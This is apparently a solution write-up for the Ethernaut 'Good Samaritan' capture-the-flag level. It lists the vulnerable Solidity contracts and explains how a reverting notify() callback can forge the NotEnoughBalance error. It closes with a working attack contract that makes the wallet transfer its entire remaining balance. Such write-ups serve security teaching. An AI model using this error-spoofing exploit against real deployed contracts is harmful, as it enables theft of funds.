# 27 - Good Samaritan

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10**6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if(amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if(dest_.isContract()) {
                // notify contract 
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if(msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

## Solution

To drain the balance of **`GoodSamaritan`** contract, we can call requestDonation `1_000_000 / 10` times.

But let's take a closer look at what happens when you call `requestDonation()` to see if there's any other way to do that.

```solidity
function requestDonation() external returns(bool enoughBalance){
    // donate 10 coins to requester
    try wallet.donate10(msg.sender) {
        return true;
    } catch (bytes memory err) {
        if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
            // send the coins left
            wallet.transferRemainder(msg.sender);
            return false;
        }
    }
}
```

When you call `requestDonation`, this will call `donate10` in **`Wallet`** contract.

And when this call throws a custom error `NotEnoughBalance`, \
it will send the rest of the coins it has.

```solidity
function donate10(address dest_) external onlyOwner {
    // check balance left
    if (coin.balances(address(this)) < 10) {
        revert NotEnoughBalance();
    } else {
        // donate 10 coins
        coin.transfer(dest_, 10);
    }
}
```

And this triggers `transfer` in **`Coin`**.

```solidity
function transfer(address dest_, uint256 amount_) external {
    uint256 currentBalance = balances[msg.sender];

    // transfer only occurs if balance is enough
    if(amount_ <= currentBalance) {
        balances[msg.sender] -= amount_;
        balances[dest_] += amount_;

        if(dest_.isContract()) {
            // notify contract 
            INotifyable(dest_).notify(amount_);
        }
    } else {
        revert InsufficientBalance(currentBalance, amount_);
    }
}
```

And here, it checks if the `recipient` is a contract.

If it is, it calls `notify` function of `recipient` contract.

We will declare same custom error `NotEnoughBalance()` and throw it when `notify` is called.

```solidity
contract AttackGooodSamaritan is INotifyable {

    error NotEnoughBalance();

    function attack(GoodSamaritan target) external {
        target.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if(amount == 10) {        
            revert NotEnoughBalance();
        }
    }
}
```

Note that we have `if` condition to prevent the transaction from being **reverted** when the rest of the token is sent.\
(This will throw `NotEnoughBalance` only at the first time it requests 10 tokens.)

Done! 😎
